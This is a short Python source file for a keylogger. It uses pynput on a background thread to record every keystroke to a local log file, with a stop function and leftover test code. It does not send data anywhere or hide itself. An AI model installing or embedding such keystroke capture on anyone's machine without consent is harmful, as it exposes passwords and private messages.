import logging
import threading
from shared_function import *
import time
from pynput.keyboard import Listener

listener = None

# setup logging
logging.basicConfig(filename='key_logger.log',
                    filemode='w',
                    level=logging.DEBUG,
                    format='%(asctime)s [%(levelname)s] %(message)s'
                    )


def key_logger():
    def key_logger():
        global listener

        def on_press(key):
            try:
                print(key)
                logging.info(key)
            except AttributeError:
                print(key)
                logging.error(key)

        with Listener(on_press=on_press) as listener:
            listener.join()

    listener_thread = threading.Thread(target=key_logger)
    listener_thread.start()


def stop_key_logger():
    global listener

    # for test
    print("stop key logger")
    time.sleep(10)
    print("----- stopped ----")
    # end test

    listener.stop()


if __name__ == "__main__":
    # TODO: test in widows
    key_logger()
    stop_key_logger()
